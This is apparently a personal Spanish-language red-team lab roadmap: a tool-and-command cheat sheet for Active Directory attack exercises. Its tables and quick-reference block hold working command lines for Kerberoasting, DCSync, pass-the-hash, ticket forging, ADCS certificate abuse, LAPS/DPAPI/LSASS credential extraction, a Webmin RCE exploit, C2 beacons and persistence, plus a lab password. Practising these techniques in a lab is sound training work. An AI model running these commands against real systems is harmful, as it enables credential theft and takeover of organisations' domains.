# 🛠️ Índice de Herramientas por Lab
## Red Team Ops Roadmap — Referencia rápida

> Mapeo de qué herramienta se usa en qué lab y para qué técnica específica.  
> Ordenado por lab para facilitar la preparación antes de ejecutar.

---

## Phase-01 — Fundamentos AD

### Lab-01 — GHOST FOREST

| Fase | Técnica | Herramienta | Comando clave | Desde |
|------|---------|-------------|---------------|-------|
| 1 | Network scan | `nmap` | `nmap -sV -sC -p- IP` | Kali |
| 1 | SMB enum | `enum4linux-ng` | `enum4linux-ng -A IP` | Kali |
| 1 | LDAP enum | `ldapsearch` | `ldapsearch -H ldap://IP -x -b "DC=..."` | Kali |
| 2 | AS-REP Roasting | `impacket-GetNPUsers` | `GetNPUsers.py dominio/ -no-pass -usersfile users.txt` | Kali |
| 2 | Kerberoasting | `impacket-GetUserSPNs` | `GetUserSPNs.py dominio/user:pass -request` | Kali |
| 2 | Password cracking | `john` / `hashcat` | `john hash.txt --wordlist=rockyou.txt` | Kali |
| 3 | WinRM shell | `evil-winrm` | `evil-winrm -i IP -u user -p pass` | Kali |
| 3 | SMB validation | `nxc` (NetExec) | `nxc smb IP -u user -p pass` | Kali |
| 4 | AD enumeration | `BloodHound CE` + `bloodhound-python` | `bloodhound-python -u user -p pass -d dominio -c All --zip` | Kali |
| 4 | AD enumeration | `SharpHound v2.5.9` | `SharpHound.exe -c All --zipfilename output.zip` | DC-01 |
| 5 | Credential hunt | `PowerShell nativo` | `reg query HKLM\SOFTWARE\... /v AutoAdminLogon` | DC-01 |
| 5 | MSSQL | `impacket-mssqlclient` | `mssqlclient.py dominio/user:pass@IP` | Kali |
| 6 | Lateral movement | `impacket-psexec` | `psexec.py dominio/user:pass@IP` | Kali |
| 7 | C2 | `Sliver` | `generate beacon --http IP:443` | Kali |
| 8 | Token impersonation | `PrintSpoofer` / `GodPotato` | `PrintSpoofer.exe -i -c cmd` | WKSTN-01 |
| 9 | Ticket forging | `impacket-ticketer` | `ticketer.py -nthash HASH -domain-sid SID -domain DOM user` | Kali |
| 10 | DCSync | `impacket-secretsdump` | `secretsdump.py dominio/user:pass@IP -just-dc-ntlm` | Kali |
| 11 | Unconstrained Delegation | `Rubeus` | `Rubeus.exe monitor /interval:5 /nowrap` | DC-01 |
| 11 | NTLM coerción | `PetitPotam` | `PetitPotam.py -u user -p pass -d dom KALI DC` | Kali |
| 11 | Constrained Delegation | `impacket-getST` | `getST.py -spn SPN -impersonate Admin dom/svc:pass` | Kali |
| 12 | GPO Abuse | `PowerShell` + `SYSVOL` | `$taskXML > ScheduledTasks.xml` | DC-01 |
| 12 | GPO apply | `gpupdate` | `gpupdate /force` | WKSTN-01 |
| 13 | ACL enum | `impacket-dacledit` | `dacledit dom/user:pass -action read -target obj` | Kali |
| 13 | Targeted Kerberoasting | `bloodyAD` | `bloodyAD set object obj servicePrincipalName -v SPN` | Kali |
| BH | BloodHound queries | `BloodHound CE Cypher` | Pathfinding + Cypher queries | Kali |

---

### Lab-02 — SILENT BRIDGE

| Fase | Técnica | Herramienta | Comando clave | Desde |
|------|---------|-------------|---------------|-------|
| 1 | Web fingerprint | `nmap` + `curl` | `nmap -sV -p 10000 IP` | Kali |
| 2 | Webmin RCE | `Python exploit` (CVE-2019-12840) | `python3 webmin_rce.py -t IP -u root -p pass -c CMD` | Kali |
| 3 | Tunneling | `Ligolo-ng` | `proxy -selfcert + agent -connect KALI:11601` | Kali + PROD |
| 4 | Git history | `git` | `git log --all && git show HASH` | Post-tunnel |
| 4 | Credential discovery | `git` | `git log -p | grep -i password` | Post-tunnel |
| 5 | WinRM | `evil-winrm` | `evil-winrm -i 10.0.3.7 -u thomas -p pass` | Kali (via túnel) |
| 6 | C2 relay | `Sliver` | `listener_add --host PROD_IP --port 443` | Kali |
| 7 | SAM dump | `impacket-secretsdump` | `secretsdump dom/user:pass@IP -sam` | Kali |
| 7 | Persistencia | `schtasks` | `schtasks /create /tn "Task" /tr CMD /sc onlogon` | PC-01 |

---

### Lab-03 — DARK GATE

| Fase | Técnica | Herramienta | Comando clave | Desde |
|------|---------|-------------|---------------|-------|
| 1 | ADCS enum | `Certipy` | `certipy find -u user@dom -p pass -dc-ip IP -vulnerable` | Kali |
| 2 | ESC1 | `Certipy` | `certipy req -u user -p pass -ca CA -template TPL -upn Admin@dom` | Kali |
| 2 | PKINIT auth | `Certipy` | `certipy auth -pfx Admin.pfx -dc-ip IP` | Kali |
| 3 | ESC4 | `Certipy` | `certipy template -u user -p pass -template TPL -save-old` | Kali |
| 4 | ESC8 (identificado) | `impacket-ntlmrelayx` | `ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs` | Kali |
| 5 | C2 | `Sliver` | `generate beacon --http IP:443 --os windows` | Kali |
| 6 | Persistencia cert | `Certipy` + PKINIT | Certificado válido post-rotación de contraseña | Kali |

---

## Herramientas pendientes — Phase-02 en adelante

| Lab | Herramienta | Técnica | Instalación |
|-----|-------------|---------|-------------|
| Lab-04 | `PowerView` | ACL enum avanzada | `Import-Module PowerView.ps1` |
| Lab-04 | `ADSearch` | LDAP queries eficientes | `ADSearch.exe --search "(objectCategory=user)"` |
| Lab-05 | `Certipy shadow` | Shadow Credentials | `certipy shadow auto -u user -p pass -account target` |
| Lab-07 | `nxc ldap -M laps` | LAPS password extraction via LDAP | `nxc ldap 10.0.2.10 -u helpdesk.ruiz -p 'Helpdesk2024!' -M laps` |
| Lab-07 | `Get-LapsADPassword` | Windows LAPS nativo (desde objetivo) | `Get-LapsADPassword -Identity WKSTN-01 -AsPlainText -Server DC-01.atackcorp.local` |
| Lab-07 | `ldeep` | LAPSv2 enum (no descifra GKDI) | `ldeep ldap -u helpdesk.ruiz -p 'Helpdesk2024!' -d atackcorp.local -s ldaps://10.0.2.10 laps` |
| Lab-07 | `impacket-dpapi` | DPAPI Master Key + credential decrypt | `impacket-dpapi masterkey -file masterkey -sid SID -password 'pass'` |
| Lab-07 | `impacket-dpapi` | DPAPI credential blob decrypt | `impacket-dpapi credential -file cred1 -key 0xMASTERKEY` |
| Lab-07 | `pywhisker` | Shadow Credentials — msDS-KeyCredentialLink | `pywhisker -d dom -u user -p pass --dc-ip IP --target WKSTN-01$ --action add --use-ldaps` |
| Lab-07 | `certipy-ad` | PKINIT auth → TGT + NT hash | `certipy-ad auth -pfx cert.pfx -dc-ip IP -domain dom -username 'WKSTN-01$' -password pfxpass` |
| Lab-07 | `nanodump` | LSASS dump sin Mimikatz | BLOQUEADO en Windows 11 23H2+ (KPP) — requiere BYOD/kernel exploit |
| Lab-07 | `lsassy` | LSASS dump remoto | `lsassy -u admin -p pass -d dom 10.0.2.8 -m comsvcs` — bloqueado en Win11 23H2+ |
| Lab-08 | `Kerbrute` | Password spraying | `kerbrute passwordspray -d dom users.txt pass` |
| Lab-08 | `GoPhish` | Phishing | Panel web en Kali |
| Lab-09 | `Havoc C2` | C2 avanzado | Compilar desde GitHub |
| Lab-13 | `AzureHound` | Azure AD enum | `azurehound -u user@tenant -p pass list` |
| Lab-13 | `ROADtools` | Azure AD analysis | `roadrecon gather -u user -p pass` |

---

## Notas operacionales — Lecciones de Lab-07

| Herramienta | Nota crítica |
|-------------|-------------|
| `certipy-ad` | Usar `certipy-ad` (v5.0.4) — NO instalar `python3-certipy` (conflicto de paquetes en Kali) |
| `pywhisker` | Añadir `--use-ldaps` en WS2025/DC moderno (LDAP signing enforced) |
| `nxc laps` | Requiere `ADPasswordEncryptionEnabled=0` en WKSTN — WS2025 usa GKDI por defecto |
| `ldeep laps` | Detecta LAPSv2 pero NO descifra GKDI: "LAPSv2 detected, password decryption is not implemented" |
| `lsassy` | Todos los métodos (comsvcs/wmi/task/mmc) bloqueados en Windows 11 23H2+ con PPL activo |
| `nanodump` | Sin releases públicas en GitHub — requiere compilación. Bloqueado en Win11 23H2+ por KPP |
| `impacket-dpapi` | Funciona completamente offline — extraer blobs con smbclient, descifrar en Kali |
| `evil-winrm` | Network Logon (tipo 3) — `cmdkey`, `rundll32 comsvcs` no funcionan sin SeDebugPrivilege |
| `evil-winrm` | Con usuarios de dominio usar formato `DOMINIO\usuario` (no solo `usuario`) |
| `nxc smb` (admin local) | NETBIOS timeout con Administrador local — usar `impacket-smbclient './Admin:pass@IP'` |

---

## Referencia rápida — Comandos más usados

```bash
# Validar credenciales rápidamente
nxc smb IP -u user -p pass

# Shell WinRM
evil-winrm -i IP -u user -p pass
evil-winrm -i IP -u user -H HASH

# Enumerar AD
bloodhound-python -u user -p pass -d dominio -ns IP -c All --zip
certipy find -u user@dom -p pass -dc-ip IP -vulnerable -stdout

# DCSync
impacket-secretsdump dominio/user:pass@IP -just-dc-ntlm

# Pass-the-Hash
impacket-psexec dominio/user@IP -hashes :HASH

# Kerberoasting
impacket-GetUserSPNs dominio/user:pass -dc-ip IP -request

# AS-REP Roasting
impacket-GetNPUsers dominio/ -no-pass -usersfile users.txt -dc-ip IP
```

---

*Red Team Ops Roadmap — Adrián Camacho | Mayo 2026*